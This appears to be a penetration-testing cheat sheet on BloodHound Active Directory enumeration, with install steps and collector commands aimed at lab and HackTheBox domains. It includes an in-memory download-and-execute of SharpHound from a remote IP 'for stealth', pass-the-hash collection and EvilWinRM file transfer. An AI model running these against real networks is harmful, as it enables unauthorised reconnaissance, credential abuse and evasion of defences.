# Bloodhound
https://github.com/SpecterOps/BloodHound

![Walking the Dog](../assets/WalkTheDog.png)

Let the dog sniff things out because automated enumeration is cool

The tools used are - [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases/), [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) or [SharpHound.ps1](https://www.noobsec.net/ad-cheatsheet/)

> BloodHound (Javascript webapp, compiled with Electron, uses Neo4j as graph DBMS) is an awesome tool that allows mapping of relationships within Active Directory environments. It mostly uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems.
```bash
# Install Dependancies
sudo apt-get install openjdk-11-jdk
sudo apt install -y neo4j
sudo neo4j start
sudo /usr/bin/neo4j console # For any debugging

# Change password to neo5j
http://localhost:7474/browser/

unzip BloodHound-linux-x64.zip
./BloodHound-linux-x64/BloodHound # may need --no-sandbox
```
## Collection
### Sharphound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

> SharpHound (sources, builds) is designed targeting .Net 4.5. It can be used as a compiled executable.
> 
> It must be run from the context of a domain user, either directly through a logon or through another method such as runas (runas /netonly /user:$DOMAIN\$USER) (see Impersonation). Alternatively, SharpHound can be used with the LdapUsername and LdapPassword flags for that matter.
```powershell
# EvilWinRM
upload SharpHound.exe

# Leverage LDAPS
./SharpHound.exe --SecureLdap

SharpHound.exe -c All

download ***.zip
```

```powershell
# Execute BloodHound in memory for more stealth
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.100.223/SharpHound.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Sharphound.Program]::Main("--collectionmethods All --domain north.sevenkingdoms.local --searchforest true --outputdirectory c:\users\public\ --zipfilename bh_north_sevenkingdoms.zip".Split())
```
### bloodhound.py
https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce

> BloodHound.py is a Python ingestor for BloodHound.
> 
> This ingestor is not as powerful as the C# one. It mostly misses GPO collection methods **but** a good news is that it can do pass-the-hash. It becomes really useful when compromising a domain account's NT hash.
```bash
bloodhound-ce-python -u florence.ramirez -p '' -ns 10.10.11.24 -c all -d ghost.htb --zip

bloodhound-ce-python -u d.baker --hashes LM:NT -ns 10.129.234.143 -c all -d scepter.htb --zip

bloodhound-ce-python -u 'l.clark' -p '' -d 'infiltrator.htb' -gc 'dc01.infiltrator.htb' -ns 10.129.8.232 -c all --zip

bloodhound.py --zip -c All -d $DOMAIN -u $USERNAME -p $PASSWORD -dc $DOMAIN_CONTROLLER
```
### Rusthound![[rusthound_logo_v3.png]]
https://github.com/NH-RED-TEAM/RustHound

```bash
rusthound --domain north.sevenkingdoms.local -u "samwell.tarly" -p "Heartsbane"
```